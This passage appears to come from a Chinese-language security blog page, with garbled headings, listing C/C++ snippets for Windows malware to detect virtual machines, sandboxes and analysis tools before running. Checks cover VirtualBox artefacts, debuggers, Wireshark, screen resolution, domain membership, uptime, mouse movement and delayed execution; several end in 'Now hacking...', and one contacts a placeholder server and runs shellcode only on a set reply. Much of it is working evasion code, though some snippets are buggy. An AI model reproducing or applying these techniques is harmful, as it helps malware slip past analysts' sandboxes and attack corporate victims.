			memcpy(mac, pAdaptersAddresses-&gt;PhysicalAddress, 6);
			if (!memcmp({ &quot;\x08\x00\x27&quot; }, mac, 3)) return false;
		}
	pAdaptersAddresses = pAdaptersAddresses-&gt;Next;
	}
}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><h3 id="è™šæ‹Ÿè®¾å¤‡æ£€æµ‹"><a href="#è™šæ‹Ÿè®¾å¤‡æ£€æµ‹" class="header-anchor">#</a> è™šæ‹Ÿè®¾å¤‡æ£€æµ‹</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>OBJECT_ATTRIBUTES objectAttributes;
UNICODE_STRING uDeviceName;
RtlSecureZeroMemory(&amp;uDeviceName, sizeof(uDeviceName));
RtlInitUnicodeString(&amp;uDeviceName, L&quot;\\Device\\VBoxGuest&quot;); // or pipe: L&quot;\\??\\pipe\\VBoxTrayIPC-&lt;username&gt;&quot;
InitializeObjectAttributes(&amp;objectAttributes, &amp;uDeviceName, OBJ_CASE_INSENSITIVE, 0, NULL);
HANDLE hDevice = NULL;
IO_STATUS_BLOCK ioStatusBlock;
NTSTATUS status = NtCreateFile(&amp;hDevice, GENERIC_READ, &amp;objectAttributes, &amp;ioStatusBlock, NULL, 0, 0, FILE_OPEN, 0, NULL, 0);
if (NT_SUCCESS(status)) return false;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><h3 id="hdd-name"><a href="#hdd-name" class="header-anchor">#</a> HDD Name</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>HDEVINFO hDeviceInfo = SetupDiGetClassDevs(&amp;GUID_DEVCLASS_DISKDRIVE, 0, 0, DIGCF_PRESENT);
SP_DEVINFO_DATA deviceInfoData;
deviceInfoData.cbSize = sizeof(SP_DEVINFO_DATA);
SetupDiEnumDeviceInfo(hDeviceInfo, 0, &amp;deviceInfoData);
DWORD propertyBufferSize;
SetupDiGetDeviceRegistryPropertyW(hDeviceInfo, &amp;deviceInfoData, SPDRP_FRIENDLYNAME, NULL, NULL, 0, &amp;propertyBufferSize);
PWSTR HDDName = (PWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, propertyBufferSize);
SetupDiGetDeviceRegistryPropertyW(hDeviceInfo, &amp;deviceInfoData, SPDRP_FRIENDLYNAME, NULL, (PBYTE)HDDName, propertyBufferSize, NULL);
CharUpperW(HDDName);
if (wcsstr(HDDName, L&quot;VBOX&quot;)) return false;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><h3 id="vm-ç‰¹å®šæ–‡ä»¶å’Œæ³¨å†Œè¡¨æ£€æŸ¥"><a href="#vm-ç‰¹å®šæ–‡ä»¶å’Œæ³¨å†Œè¡¨æ£€æŸ¥" class="header-anchor">#</a> VM ç‰¹å®šæ–‡ä»¶å’Œæ³¨å†Œè¡¨æ£€æŸ¥</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>// check files
WIN32_FIND_DATAW findFileData;
if (FindFirstFileW(L&quot;C:\\Windows\\System32\\VBox*.dll&quot;, &amp;findFileData) != INVALID_HANDLE_VALUE) return false;

// check registry key
HKEY hkResult;
if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L&quot;SYSTEM\\ControlSet001\\Services\\VBoxSF&quot;, 0, KEY_QUERY_VALUE, &amp;hkResult) == ERROR_SUCCESS) return false;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><h3 id="æ–‡ä»¶åç§°è¢«avæ›´æ”¹"><a href="#æ–‡ä»¶åç§°è¢«avæ›´æ”¹" class="header-anchor">#</a> æ–‡ä»¶åç§°è¢«AVæ›´æ”¹</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>wchar_t currentProcessPath[MAX_PATH + 1];
GetModuleFileNameW(NULL, currentProcessPath, MAX_PATH + 1);
CharUpperW(currentProcessPath);
if (!wcsstr(currentProcessPath, L&quot;C:\\USERS\\PUBLIC\\&quot;)) return false;
if (!wcsstr(currentProcessPath, L&quot;MALWARE.EXE&quot;)) return false;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><h3 id="è¢«çˆ¶è¿›ç¨‹å¯åŠ¨"><a href="#è¢«çˆ¶è¿›ç¨‹å¯åŠ¨" class="header-anchor">#</a> è¢«çˆ¶è¿›ç¨‹å¯åŠ¨</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>DWORD GetParentPID(DWORD pid)
{
	DWORD ppid = 0;
	PROCESSENTRY32W processEntry = { 0 };
	processEntry.dwSize = sizeof(PROCESSENTRY32W);
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (Process32FirstW(hSnapshot, &amp;processEntry))
	{
		do
		{
			if (processEntry.th32ProcessID == pid)
			{
				ppid = processEntry.th32ParentProcessID;
				break;
			}
		} while (Process32NextW(hSnapshot, &amp;processEntry));
	}
	CloseHandle(hSnapshot);
	return ppid;
}

void main()
{
	DWORD parentPid = GetParentPID(GetCurrentProcessId());
	WCHAR parentName[MAX_PATH + 1];
	DWORD dwParentName = MAX_PATH;
	HANDLE hParent = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, parentPid);
	QueryFullProcessImageNameW(hParent, 0, parentName, &amp;dwParentName); // another way to get process name is to use 'Toolhelp32Snapshot'
	CharUpperW(parentName);
	if (wcsstr(parentName, L&quot;WINDBG.EXE&quot;)) return;

	wprintf_s(L&quot;Now hacking...\n&quot;);
}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br></div></div><h3 id="æšä¸¾è°ƒè¯•å·¥å…·æŠ“åŒ…å·¥å…·"><a href="#æšä¸¾è°ƒè¯•å·¥å…·æŠ“åŒ…å·¥å…·" class="header-anchor">#</a> æšä¸¾è°ƒè¯•å·¥å…·æŠ“åŒ…å·¥å…·</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>PROCESSENTRY32W processEntry = { 0 };
processEntry.dwSize = sizeof(PROCESSENTRY32W);
HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
WCHAR processName[MAX_PATH + 1];
if (Process32FirstW(hSnapshot, &amp;processEntry))
{
do
{
	StringCchCopyW(processName, MAX_PATH, processEntry.szExeFile);
	CharUpperW(processName);
	if (wcsstr(processName, L&quot;WIRESHARK.EXE&quot;)) exit(0);
} while (Process32NextW(hSnapshot, &amp;processEntry));
}

wprintf_s(L&quot;Now hacking...\n&quot;);
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><h3 id="æšä¸¾æ¯ä¸ªè¿›ç¨‹çš„åœ°å€ç©ºé—´ä¸­åŠ è½½çš„æ¨¡å—ï¼Œå¹¶æ£€æŸ¥ä¸éœ€è¦çš„åç§°"><a href="#æšä¸¾æ¯ä¸ªè¿›ç¨‹çš„åœ°å€ç©ºé—´ä¸­åŠ è½½çš„æ¨¡å—ï¼Œå¹¶æ£€æŸ¥ä¸éœ€è¦çš„åç§°" class="header-anchor">#</a> æšä¸¾æ¯ä¸ªè¿›ç¨‹çš„åœ°å€ç©ºé—´ä¸­åŠ è½½çš„æ¨¡å—ï¼Œå¹¶æ£€æŸ¥ä¸éœ€è¦çš„åç§°</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>DWORD runningProcessesIDs[1024];
DWORD runningProcessesBytes;
EnumProcesses(runningProcessesIDs, sizeof(runningProcessesIDs), &amp;runningProcessesBytes);
for (int i = 0; i &lt; runningProcessesBytes / sizeof(DWORD); i++)
{
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, runningProcessesIDs[i]);
	if (!hProcess) continue;
	HMODULE processModules[1024];
	DWORD processModulesBytes;
	int s1 = EnumProcessModules(hProcess, processModules, sizeof(processModules), &amp;processModulesBytes);
	for (int j = 0; j &lt; processModulesBytes / sizeof(HMODULE); j++)
	{
		WCHAR moduleName[MAX_PATH + 1];
		GetModuleFileNameExW(hProcess, processModules[j], moduleName, MAX_PATH);
		CharUpperW(moduleName);
		if (wcsstr(moduleName, L&quot;DBGHELP.DLL&quot;)) exit(0);
	}
}

wprintf_s(L&quot;Now hacking...\n&quot;);
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><h3 id="æ£€æŸ¥çª—å£åç§°ï¼Œå¹¶å°†å…¶ä¸è¡¨ç¤ºå­˜åœ¨å¸¸è§æ¶æ„è½¯ä»¶åˆ†æå·¥å…·çš„åç§°è¿›è¡Œæ¯”è¾ƒ"><a href="#æ£€æŸ¥çª—å£åç§°ï¼Œå¹¶å°†å…¶ä¸è¡¨ç¤ºå­˜åœ¨å¸¸è§æ¶æ„è½¯ä»¶åˆ†æå·¥å…·çš„åç§°è¿›è¡Œæ¯”è¾ƒ" class="header-anchor">#</a> æ£€æŸ¥çª—å£åç§°ï¼Œå¹¶å°†å…¶ä¸è¡¨ç¤ºå­˜åœ¨å¸¸è§æ¶æ„è½¯ä»¶åˆ†æå·¥å…·çš„åç§°è¿›è¡Œæ¯”è¾ƒ</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>BOOL CALLBACK EnumWindowsProc(HWND hWindow, LPARAM parameter)
{
	WCHAR windowTitle[1024];
	GetWindowTextW(hWindow, windowTitle, sizeof(windowTitle));
	CharUpperW(windowTitle);
	if (wcsstr(windowTitle, L&quot;SYSINTERNALS&quot;)) *(PBOOL)parameter = true;
	return true;
}

void main()
{
	bool debugged = false;
	EnumWindows(EnumWindowsProc, (LPARAM)(&amp;debugged));
	if (debugged) return;

	wprintf_s(L&quot;Now hacking...\n&quot;);
}

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><h3 id="check-user-name-computer-name"><a href="#check-user-name-computer-name" class="header-anchor">#</a> check user name-computer name</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>//check computer name
DWORD computerNameLength;
wchar_t computerName[MAX_COMPUTERNAME_LENGTH + 1];
GetComputerNameW(computerName, &amp;computerNameLength);
CharUpperW(computerName);
if (wcsstr(computerName, L&quot;DESKTOP-&quot;)) return false;

//check user name
DWORD userNameLength;
wchar_t userName[UNLEN + 1];
GetUserNameW(userName, &amp;userNameLength);
CharUpperW(userName);
if (wcsstr(userName, L&quot;ADMIN&quot;)) return false;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><h3 id="ç”±äºæˆ‘ä»¬é€šå¸¸é’ˆå¯¹å…¬å¸ç¯å¢ƒï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å‡è®¾ç”¨æˆ·çš„è®¡ç®—æœºæ˜¯åŸŸçš„æˆå‘˜ã€‚è®©æˆ‘ä»¬æ£€æŸ¥æœºå™¨çš„åŸŸåŠ å…¥çŠ¶æ€ï¼š"><a href="#ç”±äºæˆ‘ä»¬é€šå¸¸é’ˆå¯¹å…¬å¸ç¯å¢ƒï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å‡è®¾ç”¨æˆ·çš„è®¡ç®—æœºæ˜¯åŸŸçš„æˆå‘˜ã€‚è®©æˆ‘ä»¬æ£€æŸ¥æœºå™¨çš„åŸŸåŠ å…¥çŠ¶æ€ï¼š" class="header-anchor">#</a> ç”±äºæˆ‘ä»¬é€šå¸¸é’ˆå¯¹å…¬å¸ç¯å¢ƒï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å‡è®¾ç”¨æˆ·çš„è®¡ç®—æœºæ˜¯åŸŸçš„æˆå‘˜ã€‚è®©æˆ‘ä»¬æ£€æŸ¥æœºå™¨çš„åŸŸåŠ å…¥çŠ¶æ€ï¼š</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>PWSTR domainName;
NETSETUP_JOIN_STATUS status;
NetGetJoinInformation(NULL, &amp;domainName, &amp;status);
if (status != NetSetupDomainName) return false;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h3 id="åˆ†è¾¨ç‡æ£€æµ‹"><a href="#åˆ†è¾¨ç‡æ£€æµ‹" class="header-anchor">#</a> åˆ†è¾¨ç‡æ£€æµ‹</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>bool CALLBACK MyCallback(HMONITOR hMonitor, HDC hdcMonitor, LPRECT lpRect, LPARAM data)
{
	MONITORINFO monitorInfo;
	monitorInfo.cbSize = sizeof(MONITORINFO);
	GetMonitorInfoW(hMonitor, &amp;monitorInfo);
	int xResolution = monitorInfo.rcMonitor.right - monitorInfo.rcMonitor.left;
	int yResolution = monitorInfo.rcMonitor.top - monitorInfo.rcMonitor.bottom;
	if (xResolution &lt; 0) xResolution = -xResolution;
	if (yResolution &lt; 0) yResolution = -yResolution;
	if ((xResolution != 1920 &amp;&amp; xResolution != 2560 &amp;&amp; xResolution != 1440)
		|| (yResolution != 1080 &amp;&amp; yResolution != 1200 &amp;&amp; yResolution != 1600 &amp;&amp; yResolution != 900))
	{
		*((BOOL*)data) = true;
	}
	return true;
}

void main()
{
	MONITORENUMPROC pMyCallback = (MONITORENUMPROC)MyCallback;
	int xResolution = GetSystemMetrics(SM_CXSCREEN);
	int yResolution = GetSystemMetrics(SM_CYSCREEN);
	if (xResolution &lt; 1000 &amp;&amp; yResolution &lt; 1000)  return false;

	int numberOfMonitors = GetSystemMetrics(SM_CMONITORS);
	bool sandbox = false;
	EnumDisplayMonitors(NULL, NULL, pMyCallback, (LPARAM)(&amp;sandbox));
	if (sandbox) return;

	wprintf_s(L&quot;Now hacking...\n&quot;);
}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br></div></div><h3 id="usbå­˜å‚¨æ£€æµ‹"><a href="#usbå­˜å‚¨æ£€æµ‹" class="header-anchor">#</a> USBå­˜å‚¨æ£€æµ‹</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>HKEY hKey;
DWORD mountedUSBDevicesCount;
RegOpenKeyEx(HKEY_LOCAL_MACHINE, L&quot;SYSTEM\\ControlSet001\\Enum\\USBSTOR&quot;, 0, KEY_READ, &amp;hKey);
RegQueryInfoKey(hKey, NULL, NULL, NULL, &amp;mountedUSBDevicesCount, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
if (mountedUSBDevicesCount &lt; 1) return false;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><h3 id="æ—¶åŒºæ£€æµ‹"><a href="#æ—¶åŒºæ£€æµ‹" class="header-anchor">#</a> æ—¶åŒºæ£€æµ‹</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>SetThreadLocale(MAKELCID(MAKELANGID(LANG_ENGLISH, SUBLANG_ENGLISH_US), SORT_DEFAULT));
DYNAMIC_TIME_ZONE_INFORMATION dynamicTimeZoneInfo;
GetDynamicTimeZoneInformation(&amp;dynamicTimeZoneInfo);
wchar_t timeZoneName[128 + 1];
StringCchCopyW(timeZoneName, 128, dynamicTimeZoneInfo.TimeZoneKeyName);
CharUpperW(timeZoneName);
if (!wcsstr(timeZoneName, L&quot;CENTRAL EUROPEAN STANDARD TIME&quot;)) return false;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><h3 id="è¯­è¨€æ£€æµ‹"><a href="#è¯­è¨€æ£€æµ‹" class="header-anchor">#</a> è¯­è¨€æ£€æµ‹</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="æ£€æµ‹è‡ªåŠ¨åŒ–åˆ†æ"><a href="#æ£€æµ‹è‡ªåŠ¨åŒ–åˆ†æ" class="header-anchor">#</a> æ£€æµ‹è‡ªåŠ¨åŒ–åˆ†æ</h2> <h3 id="ç½‘ç»œè¿æ¥"><a href="#ç½‘ç»œè¿æ¥" class="header-anchor">#</a> ç½‘ç»œè¿æ¥</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>HINTERNET hSession = WinHttpOpen(L&quot;Mozilla 5.0&quot;, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
HINTERNET hConnection = WinHttpConnect(hSession, L&quot;my.domain.or.ip&quot;, INTERNET_DEFAULT_HTTP_PORT, 0);
HINTERNET hRequest = WinHttpOpenRequest(hConnection, L&quot;GET&quot;, L&quot;test&quot;, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, NULL);
WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
BOOL status = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
if (!status) return false;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>æ”¶åˆ°ç‰¹å®šresp æ‰§è¡Œshellcode</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>HINTERNET hSession = WinHttpOpen(L&quot;Mozilla 5.0&quot;, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
HINTERNET hConnection = WinHttpConnect(hSession, L&quot;my.domain.or.ip&quot;, INTERNET_DEFAULT_HTTP_PORT, 0);
HINTERNET hRequest = WinHttpOpenRequest(hConnection, L&quot;GET&quot;, L&quot;test&quot;, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, NULL);
WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
WinHttpReceiveResponse(hRequest, 0);
DWORD responseLength;
WinHttpQueryDataAvailable(hRequest, &amp;responseLength);
PVOID response = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, responseLength + 1);
WinHttpReadData(hRequest, response, responseLength, &amp;responseLength);
if (atoi((PSTR)response) != 1337) return false;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><h3 id="ç”¨æˆ·äº¤äº’"><a href="#ç”¨æˆ·äº¤äº’" class="header-anchor">#</a> ç”¨æˆ·äº¤äº’</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>POINT currentMousePosition;
POINT previousMousePosition;
GetCursorPos(&amp;previousMousePosition);
double mouseDistance = 0;
while (true)
{
	GetCursorPos(&amp;currentMousePosition);
	mouseDistance += sqrt(
		pow(currentMousePosition.x - previousMousePosition.x, 2) +
		pow(currentMousePosition.y - previousMousePosition.y, 2)
	);
	Sleep(100);
	previousMousePosition = currentMousePosition;
	if (mouseDistance &gt; 20000) break;
}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><h3 id="æœ€è¿‘æ–‡æ¡£æ•°ç›®"><a href="#æœ€è¿‘æ–‡æ¡£æ•°ç›®" class="header-anchor">#</a> æœ€è¿‘æ–‡æ¡£æ•°ç›®</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>PWSTR recentFolder = NULL;
SHGetKnownFolderPath(FOLDERID_Recent, 0, NULL, &amp;recentFolder);
wchar_t recentFolderFiles[MAX_PATH + 1] = L&quot;&quot;;
StringCbCatW(recentFolderFiles, MAX_PATH, recentFolder);
StringCbCatW(recentFolderFiles, MAX_PATH, L&quot;\\*&quot;);
int numberOfRecentFiles = 0;
WIN32_FIND_DATAW findFileData;
HANDLE hFind = FindFirstFileW(recentFolderFiles, &amp;findFileData);
if (hFind != INVALID_HANDLE_VALUE)
{
	do
	{
		numberOfRecentFiles++;
	} while (FindNextFileW(hFind, &amp;findFileData));
}
if (numberOfRecentFiles &gt;= 2) numberOfRecentFiles-=2; //exclude '.' and '..'
if (numberOfRecentFiles &lt; 20) return false;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><h3 id="è¿›ç¨‹æ•°"><a href="#è¿›ç¨‹æ•°" class="header-anchor">#</a> è¿›ç¨‹æ•°</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>DWORD runningProcessesIDs[1024];
DWORD runningProcessesCountBytes;
DWORD runningProcessesCount;
EnumProcesses(runningProcessesIDs, sizeof(runningProcessesIDs), &amp;runningProcessesCountBytes);
runningProcessesCount = runningProcessesCountBytes / sizeof(DWORD);
if (runningProcessesCount &lt; 50) return false;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><h3 id="ç³»ç»Ÿè¿è¡Œæ—¶é—´"><a href="#ç³»ç»Ÿè¿è¡Œæ—¶é—´" class="header-anchor">#</a> ç³»ç»Ÿè¿è¡Œæ—¶é—´</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>ULONGLONG uptime = GetTickCount64() / 1000;
if (uptime &lt; 1200) return false; //20 minutes
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h3 id="å»¶è¿Ÿæ‰§è¡Œ"><a href="#å»¶è¿Ÿæ‰§è¡Œ" class="header-anchor">#</a> å»¶è¿Ÿæ‰§è¡Œ</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>ULONGLONG uptimeBeforeSleep = GetTickCount64();
typedef NTSTATUS(WINAPI *PNtDelayExecution)(IN BOOLEAN, IN PLARGE_INTEGER);
PNtDelayExecution pNtDelayExecution = (PNtDelayExecution)GetProcAddress(GetModuleHandleW(L&quot;ntdll.dll&quot;), &quot;NtDelayExecution&quot;);
LARGE_INTEGER delay;
delay.QuadPart = -10000 * 100000; // 100 seconds
pNtDelayExecution(FALSE, &amp;delay);
ULONGLONG uptimeAfterSleep = GetTickCount64();
if ((uptimeAfterSleep - uptimeBeforeSleep) &lt; 100000) return false;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h3 id="å†…æ ¸ç”¨æˆ·å…±äº«æ•°æ®"><a href="#å†…æ ¸ç”¨æˆ·å…±äº«æ•°æ®" class="header-anchor">#</a> å†…æ ¸ç”¨æˆ·å…±äº«æ•°æ®</h3> <blockquote><p>ä¸€äº›å¤æ‚çš„æ²™ç®±å¯èƒ½ä¼šåŒæ—¶é’©ä½ä¸¤ä¸ªSleepåŠŸèƒ½ï¼ˆç”šè‡³æ˜¯å†…æ ¸æ¨¡å¼ZwDelayExecutionï¼›ä½†æ˜¯ï¼Œæˆ‘è®¤ä¸ºå¦‚ä»Šï¼Œå†…æ ¸é’©å­éœ€è¦ç®¡ç†ç¨‹åºçº§åˆ«çš„è®¿é—®ï¼‰å’ŒGetTickCount64ï¼ˆæˆ–å†…æ ¸æ¨¡å¼KeQueryTickCountï¼‰ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨KUSER_SHARED_DATAç³»ç»Ÿå†…æ 